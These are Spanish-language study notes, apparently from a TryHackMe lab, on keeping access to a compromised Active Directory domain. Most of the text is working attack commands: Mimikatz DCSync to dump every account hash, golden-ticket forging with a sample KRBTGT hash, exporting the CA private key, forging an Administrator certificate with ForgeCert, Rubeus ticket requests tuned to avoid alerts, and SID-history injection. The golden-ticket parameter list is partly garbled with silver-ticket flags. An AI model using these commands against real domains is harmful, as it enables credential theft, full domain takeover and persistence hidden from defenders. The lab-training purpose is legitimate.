# Persistencia en Active Directory

Durante un ataque a AD, necesitaremos estar seguros de tener persistencia. En caso de que el blue team nos eche o cambie las credenciales.

Conexión a una red de Dominio desde Ubuntu

```
systemd-resolve --interface persistad --set-dns $THMDCIP --set-domain za.tryhackme.loc
```
```
xfreerdp /v:10.200.61.248 /u:Administrator /p:tryhackmewouldnotguess1@ /dynamic-resolution
```
# Persistencia con credenciales

## DC Sync

Como entendemos tener un simple DC por dominio es ilogico. Estos dominios usan multiples localizaciones, con o cual eso significa que necesitan autentificarse a AD desde diferentes servicios.

Osea que la replicación de dominio. o el controlador KCC. Genera una topología replicada como si fuera un bosque de AD y automaticamente se conecta a los controladores por RPC. 

Un ataque popular es el DC Sync attac. Teniendo acceso a una cuenta podemos replicar los permisos, con los controladres de dominio

## No todas las credenciales se pueden crear igual

Antes de empezar con dicho ataque, tenemos que ver su potencial. Mientras siempre sepas las credenciales de un privilegio esta guay, pero si no tenemos dichas credenciales o privilegios. deberemos saber esto:

- Credenciales de administrador
- Servicios de cuentas con permisos delegaods
- Cuentas de usuarios con privilegios en servicios de AD

## DCSync ALL

Utilizaremos Mimikatz para encontrar credenciales y conectarnos via ssh

![image](https://github.com/user-attachments/assets/0b59539a-f621-470f-b8eb-3bc1e284dd8f)

```
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

Con esto sacamos los hashes NTLM de usuarios en cuestión del AD

```
log <username>_dcdump.txt
```
```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

# Persistencia a base de tickets

Antes de meternos a los tickets de oro o tickets de plata,a necesitamos volver a saber como funciona la autenticación de kerberos. Diagrama abajo

![image](https://github.com/user-attachments/assets/42927f5c-0719-40c9-80d7-7ab1f5f2db4f)

## Tickets de Oro

Este ticket para que entendamos nos olvidamos de los TGTs, pudiendo conectarnos a cualquier controlador de dominio que nosotros queramos. Para conseguir un ticket de estas carcateristica, necesitamos la cuenta de krbtht y su hash para iniciar con el TGT de la cuenta.

- Para injectarlo, no necesitamos el hash de las password, el TGT solo se usa para probar el KDC puede iniciar en el DC. Una vez que nos hemos registrador con el hash de krbtgt la verificacion pasa.
- Hablando de los contenidos, el KDC solo es valido si l acuenta del usuario especifica no es mayor a 20minutos.
- Sobre las politicas y reglas de los tickets que manda el TGT, se pueden escribir valores, como por ejemplo que los tickets sean validos por 10 horas.
- Por defecto la contraseña de KRBTT nunca se cambia, a noser que manualmente rote.

## Tickets de plata

Los tickets de plata tambien se hacen como TGS tickets, una vez, nosotros pasamos las comunicaciones anteriores del diagrama, necesitamos que el KDC del DC acceda al servicio directamente.

- Los TGS se firman con la cuenta de la maquina y el host como target
- La diferencia entre el otro ticket es el privilegio que adquirimos. Si nosotros tenemos el hash de KRBTGT, podemos acceder a lo que queramos. Con un ticket de plata, podemos acceder a los servicios o permisos que tenga la cuenta en cuestión.
- Los permisos son determinados con SIDs, una vez creamos el usuario no existente con el yticket, el ticket revela un SID y actua como usuario de host local
- La contraseña de la cuenta rota normalmente cada 30 dias, con lo cual no es buena persistencia.

## Forjas tickets por diversion

Una vez que estan explicados vamos a ello.

Necesitamos el hash de la cuenta KRBTGT asociada a un host : 16f9af38fca3ada405386b3b57366082

También necesitaremos la información "Domain SID" usando pocos privilegios desde powershell

```
Get-ADDomain
```

dento de mimikatz
```
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```
/admin - The username we want to impersonate. This does not have to be a valid user.
/domain - The FQDN of the domain we want to generate the ticket for.
/id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
/sid -The SID of the domain we want to generate the ticket for.
/target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
/rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
/service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
/ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

# Persistencia Con Credenciales

Las certficaciones que nos dan los Administradores de dominio, se pueden usar como persistencia. Una certificacion valida que se usa como autentificación de cliente. Pûede usarse como certificación de ocnsulta TGT: 

Dependiendo en muchos casos, podemos robar la llave de certificacion CA para generar nuestros propios certificados confiables. 

## Extraer llave privada

La llave privada se guarda en el CA del servidor. Si la llave no esta protegida por ninguna hardware o modelo de seguridad en muchos casos los AD esta protegidos por protecione de datos pero podemos usar herramientas como:

Mimikatz y SharDPAPI para extraer certificador CA.

Dentro del windows

```
mkdir usuario
cd usuario
mimikatz.exe
```
```
crypto::certificates /systemstore:local_machine
```

Con esto vemos las certificaciones guardads en el DC
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched
```

Si tenemos un error no nos tenemos que preocupar podemos ejectuar la ruta antes.

```
crypto::certificates /systemstore:local_machine /export
```
## Generar nuestros propios certificados

Ahora que tneemos la llave privada y el certicado CA del root, podemos usar SpectorOPS para forjar una autenticación de cliente. 

```
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```
CaCertPath - The path to our exported CA certificate.
CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
NewCertPath - The path to where ForgeCert will store the generated certificate.
NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

Podemos usar Rubeus para la consulta TGT usando el certificado par averificar que e svalido

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

/user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
/enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
/certificate - Path to the certificate we have generated
/password - The password for our certificate file
/outfile - The file where our TGT will be output to
/domain - The FQDN of the domain we are currently attacking
/dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

Una vez ejecutado el comando recibiremos nuestro TGT

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
```

Usamos mimikatz para cargar el TGT y autentificar el THMDC

```
kerberos::ptt administrator.kirbi
exit
```

# Persistencia por Historial SID

Los identificadores de seguridad o (SID) principalmente se usan para saber el trackeo de una cuenta y el acceso cuando se conecta a los recrusos.

## Hacer uno

```
Get-ADGroup "Domain Admins"
```
```
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
PS C:\Users\Administrator.ZA>Start-Service -Name ntds
```
```
Get-ADUser aaron.jones -Properties sidhistory
```













